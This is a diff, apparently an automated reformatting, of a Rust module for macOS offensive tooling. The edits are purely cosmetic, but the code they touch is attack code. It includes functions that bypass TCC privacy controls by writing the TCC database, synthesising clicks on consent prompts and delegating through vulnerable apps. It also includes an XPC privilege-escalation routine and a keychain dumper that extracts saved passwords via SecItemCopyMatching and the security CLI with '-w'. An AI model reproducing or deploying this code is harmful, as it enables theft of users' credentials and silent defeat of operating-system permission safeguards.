@@ -45,19 +45,15 @@ use std::path::{Path, PathBuf};
 
 #[cfg(target_os = "macos")]
 use crate::macos_ffi::{
-    kcf_boolean_true,
-    CFAllocatorRef, CFArrayRef, CFBooleanRef, CFDataRef, CFDictionaryRef, CFNumberRef,
-    CFStringRef, CFTypeRef,
-    CGEventRef, CGEventSourceRef, CGPoint, CGRect, CGSize,
-    K_CF_ALLOCATOR_DEFAULT, K_CFSTRING_ENCODING_UTF8,
-    K_CGEVENT_LEFT_BUTTON, K_CGEVENT_MOUSE_DOWN, K_CGEVENT_MOUSE_UP,
-    _K_CGEVENT_SOURCE_STATE_HID_SYSTEM,
-    CFArrayGetCount, CFArrayGetValueAtIndex, CFBooleanGetValue, CFDataGetBytePtr, CFDataGetLength,
-    CFDictionaryCreate, CFDictionaryGetValue, CFGetTypeID, CFNumberCreate, CFNumberGetValue,
-    CFRelease, CFStringCreateWithCString, CFStringGetCString, CFStringGetLength,
-    CGDisplayBounds, CGEventCreate, CGEventCreateMouseEvent, CGEventGetLocation, CGEventPost,
-    CGMainDisplayID,
-    kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks,
+    kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks, kcf_boolean_true,
+    CFAllocatorRef, CFArrayGetCount, CFArrayGetValueAtIndex, CFArrayRef, CFBooleanGetValue,
+    CFBooleanRef, CFDataGetBytePtr, CFDataGetLength, CFDataRef, CFDictionaryCreate,
+    CFDictionaryGetValue, CFDictionaryRef, CFGetTypeID, CFNumberCreate, CFNumberGetValue,
+    CFNumberRef, CFRelease, CFStringCreateWithCString, CFStringGetCString, CFStringGetLength,
+    CFStringRef, CFTypeRef, CGDisplayBounds, CGEventCreate, CGEventCreateMouseEvent,
+    CGEventGetLocation, CGEventPost, CGEventRef, CGEventSourceRef, CGMainDisplayID, CGPoint,
+    CGRect, CGSize, _K_CGEVENT_SOURCE_STATE_HID_SYSTEM, K_CFSTRING_ENCODING_UTF8,
+    K_CF_ALLOCATOR_DEFAULT, K_CGEVENT_LEFT_BUTTON, K_CGEVENT_MOUSE_DOWN, K_CGEVENT_MOUSE_UP,
 };
 
 // Re-export helper that constructs a CFStringRef from a Rust string.
@@ -218,14 +214,8 @@ const K_SEC_CLASS_KEY: u32 = 0x6B65_7973; // "keys"
 #[cfg(target_os = "macos")]
 #[link(name = "Security", kind = "framework")]
 extern "C" {
-    fn SecItemCopyMatching(
-        query: CFDictionaryRef,
-        result: *mut CFTypeRef,
-    ) -> OSStatus;
-    fn SecKeyCopyAttributeValue(
-        key: SecKeyRef,
-        attr: CFStringRef,
-    ) -> CFTypeRef;
+    fn SecItemCopyMatching(query: CFDictionaryRef, result: *mut CFTypeRef) -> OSStatus;
+    fn SecKeyCopyAttributeValue(key: SecKeyRef, attr: CFStringRef) -> CFTypeRef;
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -465,10 +455,7 @@ pub fn bypass_tcc_via_tcc_database(resource: TccResource) -> Result<TccBypassRes
             resource,
             success: true,
             technique: "TCC database write".to_string(),
-            message: format!(
-                "inserted TCC allow entry for {} → {}",
-                service, exe_path
-            ),
+            message: format!("inserted TCC allow entry for {} → {}", service, exe_path),
         })
     } else {
         let stderr = String::from_utf8_lossy(&output.stderr);
@@ -581,7 +568,9 @@ pub fn bypass_tcc_via_synthetic_click(resource: TccResource) -> Result<TccBypass
         message: if granted {
             format!(
                 "TCC grant confirmed for {} (click at ({:.0}, {:.0}))",
-                resource.service_name(), allow_x, allow_y
+                resource.service_name(),
+                allow_x,
+                allow_y
             )
         } else {
             format!(
@@ -755,12 +744,22 @@ pub fn bypass_tcc_via_vulnerable_process(resource: TccResource) -> Result<TccByp
             success: confirmed,
             technique: format!("vulnerable process delegation via {}", app_name),
             message: if confirmed {
-                format!("delegated {} access confirmed via {} (output: {})",
-                    resource.service_name(), app_name,
-                    if stdout.is_empty() { "no output" } else { &stdout })
+                format!(
+                    "delegated {} access confirmed via {} (output: {})",
+                    resource.service_name(),
+                    app_name,
+                    if stdout.is_empty() {
+                        "no output"
+                    } else {
+                        &stdout
+                    }
+                )
             } else {
-                format!("osascript succeeded but no access confirmation for {} via {}",
-                    resource.service_name(), app_name)
+                format!(
+                    "osascript succeeded but no access confirmation for {} via {}",
+                    resource.service_name(),
+                    app_name
+                )
             },
         })
     } else {
@@ -878,10 +877,7 @@ pub fn check_sip_status() -> SipInfo {
             String::from_utf8_lossy(&output.stdout).trim().to_string(),
             output.status.success(),
         ),
-        Err(e) => (
-            format!("failed to run csrutil: {}", e),
-            false,
-        ),
+        Err(e) => (format!("failed to run csrutil: {}", e), false),
     };
 
     // Parse csrutil output.
@@ -1076,48 +1072,24 @@ extern "C" {
         targetq: *const c_void,
         flags: u64,
     ) -> XpcConnectionT;
-    fn xpc_connection_set_event_handler(
-        conn: XpcConnectionT,
-        handler: *const c_void,
-    );
+    fn xpc_connection_set_event_handler(conn: XpcConnectionT, handler: *const c_void);
     fn xpc_connection_resume(conn: XpcConnectionT);
     fn xpc_connection_cancel(conn: XpcConnectionT);
-    fn xpc_connection_send_message(
-        conn: XpcConnectionT,
-        message: *const c_void,
-    );
+    fn xpc_connection_send_message(conn: XpcConnectionT, message: *const c_void);
     fn xpc_dictionary_create(
         keys: *const *const i8,
         values: *const *const c_void,
         count: usize,
     ) -> *mut c_void;
-    fn xpc_dictionary_set_string(
-        dict: *mut c_void,
-        key: *const i8,
-        val: *const i8,
-    );
-    fn xpc_dictionary_get_string(
-        dict: *const c_void,
-        key: *const i8,
-    ) -> *const i8;
+    fn xpc_dictionary_set_string(dict: *mut c_void, key: *const i8, val: *const i8);
+    fn xpc_dictionary_get_string(dict: *const c_void, key: *const i8) -> *const i8;
     fn xpc_connection_send_message_with_reply_sync(
         conn: XpcConnectionT,
         message: *const c_void,
     ) -> *mut c_void;
-    fn xpc_dictionary_set_int64(
-        dict: *mut c_void,
-        key: *const i8,
-        val: i64,
-    );
-    fn xpc_dictionary_get_int64(
-        dict: *const c_void,
-        key: *const i8,
-    ) -> i64;
-    fn xpc_dictionary_set_bool(
-        dict: *mut c_void,
-        key: *const i8,
-        val: bool,
-    );
+    fn xpc_dictionary_set_int64(dict: *mut c_void, key: *const i8, val: i64);
+    fn xpc_dictionary_get_int64(dict: *const c_void, key: *const i8) -> i64;
+    fn xpc_dictionary_set_bool(dict: *mut c_void, key: *const i8, val: bool);
     fn xpc_get_type(obj: *const c_void) -> *const c_void;
     fn xpc_release(obj: *mut c_void);
 }
@@ -1175,9 +1147,8 @@ fn walk_dir_recursive(dir: &Path, max_depth: usize) -> Result<Vec<PathBuf>> {
         return Ok(entries);
     }
 
-    let read_dir = std::fs::read_dir(dir).with_context(|| {
-        format!("cannot read directory: {}", dir.display())
-    })?;
+    let read_dir = std::fs::read_dir(dir)
+        .with_context(|| format!("cannot read directory: {}", dir.display()))?;
 
     for entry in read_dir {
         let entry = entry?;
@@ -1266,11 +1237,7 @@ pub fn connect_to_xpc_service(service_name: &str) -> Result<XpcConnection> {
         .map_err(|_| anyhow!("service name contains null byte"))?;
 
     let conn = unsafe {
-        xpc_connection_create_mach_service(
-            c_name.as_ptr() as *const i8,
-            std::ptr::null(),
-            0,
-        )
+        xpc_connection_create_mach_service(c_name.as_ptr() as *const i8, std::ptr::null(), 0)
     };
 
     if conn.is_null() {
@@ -1381,10 +1348,7 @@ pub fn exploit_xpc_privilege_escalation(service: &XpcService) -> Result<XpcExplo
                     service_name: service.name.clone(),
                     success: false,
                     technique: "XPC exploitation".to_string(),
-                    message: format!(
-                        "no protocol handler for service '{}'",
-                        mach_name
-                    ),
+                    message: format!("no protocol handler for service '{}'", mach_name),
                 });
             }
         }
@@ -1710,7 +1674,9 @@ pub fn dump_keychain() -> Result<Vec<KeychainEntry>> {
             }
         }
         // Fallback to CLI if Security framework returned empty or errored.
-        tracing::debug!("dump_keychain: Security framework returned no entries, falling back to CLI");
+        tracing::debug!(
+            "dump_keychain: Security framework returned no entries, falling back to CLI"
+        );
     }
 
     // ── Fallback: security CLI ────────────────────────────────────────
@@ -1738,12 +1704,18 @@ fn dump_keychain_via_security_framework() -> Result<Vec<KeychainEntry>> {
     let mut entries = Vec::new();
 
     // Generic passwords.
-    if let Ok(generic) = sec_item_query_class(K_SEC_CLASS_GENERIC_PASSWORD, KeychainEntryType::GenericPassword) {
+    if let Ok(generic) = sec_item_query_class(
+        K_SEC_CLASS_GENERIC_PASSWORD,
+        KeychainEntryType::GenericPassword,
+    ) {
         entries.extend(generic);
     }
 
     // Internet passwords.
-    if let Ok(internet) = sec_item_query_class(K_SEC_CLASS_INTERNET_PASSWORD, KeychainEntryType::InternetPassword) {
+    if let Ok(internet) = sec_item_query_class(
+        K_SEC_CLASS_INTERNET_PASSWORD,
+        KeychainEntryType::InternetPassword,
+    ) {
         entries.extend(internet);
     }
 
@@ -1767,22 +1739,30 @@ fn sec_item_query_class(
     let k_class = cf_str("class").ok_or_else(|| anyhow!("failed to create kSecClass CFString"))?;
     let _k_class_guard = CfGuard::new(k_class as *const c_void);
 
-    let k_return_attrs = cf_str("r_Attr").ok_or_else(|| anyhow!("failed to create kSecReturnAttributes CFString"))?;
+    let k_return_attrs = cf_str("r_Attr")
+        .ok_or_else(|| anyhow!("failed to create kSecReturnAttributes CFString"))?;
     let _k_attrs_guard = CfGuard::new(k_return_attrs as *const c_void);
 
-    let k_return_data = cf_str("r_Data").ok_or_else(|| anyhow!("failed to create kSecReturnData CFString"))?;
+    let k_return_data =
+        cf_str("r_Data").ok_or_else(|| anyhow!("failed to create kSecReturnData CFString"))?;
     let _k_data_guard = CfGuard::new(k_return_data as *const c_void);
 
-    let k_match_limit = cf_str("m_Limit").ok_or_else(|| anyhow!("failed to create kSecMatchLimit CFString"))?;
+    let k_match_limit =
+        cf_str("m_Limit").ok_or_else(|| anyhow!("failed to create kSecMatchLimit CFString"))?;
     let _k_limit_guard = CfGuard::new(k_match_limit as *const c_void);
 
     // kSecMatchLimitAll = "m_LAll" as a CFStringRef.
-    let v_match_all = cf_str("m_LAll").ok_or_else(|| anyhow!("failed to create kSecMatchLimitAll CFString"))?;
+    let v_match_all =
+        cf_str("m_LAll").ok_or_else(|| anyhow!("failed to create kSecMatchLimitAll CFString"))?;
     let _v_limit_guard = CfGuard::new(v_match_all as *const c_void);
 
     // kSecClass value: wrap the four-char code in a CFNumber.
     let v_class = unsafe {
-        CFNumberCreate(K_CF_ALLOCATOR_DEFAULT, 4i32 /* kCFNumberSInt32Type */, &sec_class_fourcc as *const u32 as *const c_void)
+        CFNumberCreate(
+            K_CF_ALLOCATOR_DEFAULT,
+            4i32, /* kCFNumberSInt32Type */
+            &sec_class_fourcc as *const u32 as *const c_void,
+        )
     };
     if v_class.is_null() {
         return Err(anyhow!("CFNumberCreate for kSecClass returned null"));
@@ -1827,10 +1807,15 @@ fn sec_item_query_class(
     let status = unsafe { SecItemCopyMatching(query, &mut result) };
     if status != ERR_SEC_SUCCESS {
         // No items found is not an error — return empty.
-        if status == -25300 /* errSecItemNotFound */ {
+        if status == -25300
+        /* errSecItemNotFound */
+        {
             return Ok(Vec::new());
         }
-        return Err(anyhow!("SecItemCopyMatching failed with OSStatus {}", status));
+        return Err(anyhow!(
+            "SecItemCopyMatching failed with OSStatus {}",
+            status
+        ));
     }
     let _result_guard = CfGuard::new(result);
 
@@ -1983,11 +1968,7 @@ fn retrieve_password(class: &str, service: &str, account: &str) -> Option<String
 
     let output = std::process::Command::new("/usr/bin/security")
         .args([
-            find_cmd,
-            "-s",
-            service,
-            "-a",
-            account,
+            find_cmd, "-s", service, "-a", account,
             "-w", // Output password only (requires Keychain unlock).
         ])
         .output()
@@ -2112,9 +2093,7 @@ fn _current_bundle_id() -> Option<String> {
                         .output()
                         .ok()?;
                     if output.status.success() {
-                        return Some(
-                            String::from_utf8_lossy(&output.stdout).trim().to_string(),
-                        );
+                        return Some(String::from_utf8_lossy(&output.stdout).trim().to_string());
                     }
                 }
             }
@@ -2134,10 +2113,7 @@ mod tests {
 
     #[test]
     fn test_tcc_resource_service_names() {
-        assert_eq!(
-            TccResource::Camera.service_name(),
-            "kTCCServiceCamera"
-        );
+        assert_eq!(TccResource::Camera.service_name(), "kTCCServiceCamera");
         assert_eq!(
             TccResource::FullDiskAccess.service_name(),
             "kTCCServiceSystemPolicyAllFiles"
@@ -2201,10 +2177,7 @@ mod tests {
             extract_quoted_value("\"svce\"<blob>=\"com.apple.Safari\""),
             "com.apple.Safari"
         );
-        assert_eq!(
-            extract_quoted_value("service: \"MyService\""),
-            "MyService"
-        );
+        assert_eq!(extract_quoted_value("service: \"MyService\""), "MyService");
     }
 
     #[test]
